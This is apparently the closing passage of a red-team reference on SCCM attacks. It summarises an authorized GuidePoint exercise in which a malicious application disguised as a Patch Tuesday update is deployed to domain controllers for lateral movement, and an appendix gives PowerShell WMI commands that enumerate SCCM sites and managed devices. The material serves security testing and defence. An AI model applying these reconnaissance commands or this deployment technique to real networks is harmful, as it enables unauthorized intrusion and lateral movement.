- **Reference:** [Microsoft MSRC: Disrupting Active Exploitation of SharePoint](https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilitie/)

### Example 2: GuidePoint Red Team SCCM Attack Simulation (2025)

- **Target:** Enterprise test environment (authorized red team exercise)
- **Timeline:** 4-hour engagement
- **Technique Status:** Successful SCCM exploitation for lateral movement
- **Attack Flow:**
  1. Obtained SCCM admin credentials via social engineering
  2. Created collection targeting all Domain Controllers
  3. Created malicious application ("Windows Patch Tuesday Update")
  4. Deployed application to collection
  5. Forced policy evaluation on Domain Controllers
  6. Beacon executed with SYSTEM privileges within 2 minutes
  7. Lateral movement to other servers via compromised DC creds
- **Impact:** Simulated complete network compromise in under 4 hours
- **Reference:** [GuidePoint Security: SCCM Exploitation Guide](https://www.guidepointsecurity.com/blog/sccm-exploitation-evading-defenses-and-moving-laterally-with-sccm-application-deployment)

---

## APPENDIX: Quick Test Commands

**Check SCCM Accessibility:**
```powershell
# Verify SMS Provider access
Get-WmiObject -Namespace "root\sms" -Class "__Namespace" -List

# Enumerate SCCM sites
Get-WmiObject -Namespace "root\sms" -Class "SMS_Site" | Select-Object SiteCode, SiteName

# Expected output: SCCM site information if accessible
```

**Enumerate Managed Devices:**
```powershell
# Count managed devices
Get-WmiObject -Namespace "root\sms\site_<SiteCode>" -Class "SMS_R_System" | Measure-Object

# Expected output: Number of managed endpoints
```

---